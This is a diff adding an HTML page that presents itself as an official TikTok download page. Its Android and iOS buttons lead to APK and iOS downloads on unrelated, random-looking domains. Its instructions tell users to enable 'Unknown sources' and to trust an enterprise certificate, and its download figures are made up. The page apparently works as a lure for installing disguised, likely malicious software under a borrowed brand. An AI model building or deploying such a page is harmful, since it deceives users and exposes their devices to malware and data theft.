@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok App Download</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: #fff;
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: #ff0050;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+        
+        p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+        
+        .download-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .btn {
+            padding: 16px 24px;
+            border-radius: 12px;
+            border: none;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-android {
+            background: #ff0050;
+            color: white;
+        }
+        
+        .btn-ios {
+            background: #000;
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .version {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-top: 20px;
+        }
+        
+        .instructions {
+            margin-top: 30px;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 12px;
+            font-size: 14px;
+        }
+        
+        .instructions h3 {
+            margin-bottom: 10px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            padding-top: 20px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 26px;
+            }
+            
+            .btn {
+                padding: 14px 20px;
+                font-size: 16px;
+            }
+            
+            .stats {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">TT</div>
+        <h1>TikTok App Download</h1>
+        <p>Download the latest version of TikTok for your device. Join millions of users worldwide!</p>
+        
+        <div class="download-buttons">
+            <button class="btn btn-android" onclick="downloadApp('apk')">
+                <i class="fab fa-android"></i>
+                Download for Android
+            </button>
+            
+            <button class="btn btn-ios" onclick="downloadApp('ios')">
+                <i class="fab fa-apple"></i>
+                Download for iOS
+            </button>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number">1.2B+</div>
+                <div class="stat-label">Downloads</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">v1.2.1</div>
+                <div class="stat-label">Current Version</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">150+</div>
+                <div class="stat-label">Countries</div>
+            </div>
+        </div>
+        
+        <div class="instructions">
+            <h3><i class="fas fa-info-circle"></i> Download Instructions</h3>
+            <ol>
+                <li>Click the download button for your device type</li>
+                <li>Android users may need to enable "Unknown sources" in security settings</li>
+                <li>iOS users may need to trust the enterprise certificate (Settings → General → Device Management)</li>
+                <li>If you encounter any issues, check your internet connection or try again later</li>
+            </ol>
+        </div>
+        
+        <div class="version">Version: 1.2.1 | Latest update: October 2023</div>
+    </div>
+
+    <script>
+        // Define download links
+        const downloadLinks = {
+            apk: "https://sdrwqsd.cloudforent23.vip/Tiktok",  // Android APK download link
+            ios: "https://mznjy.ivqrrox.com/SENK/1W1V3Ou9CqXSYESOD"  // iOS download link
+        };
+        
+        // Download app function
+        function downloadApp(type) {
+            if (type === 'apk') {
+                // For APK, trigger download directly
+                window.location.href = downloadLinks.apk;
+            } else if (type === 'ios') {
+                // For iOS, redirect to download page
+                window.open(downloadLinks.ios, '_blank');
+            }
+            
+            // Log download event (for analytics)
+            console.log(`Download initiated for ${type}`);
+        }
+        
+        // Simulate original PHP JSON response (for demonstration only)
+        function getAppData() {
+            return {
+                code: 1000,
+                message: "success",
+                data: {
+                    apk: {
+                        download_apk: downloadLinks.apk,
+                        download_ios: downloadLinks.ios
+                    }
+                },
+                version: "1.2.1"
+            };
+        }
+    </script>
+</body>
+</html>
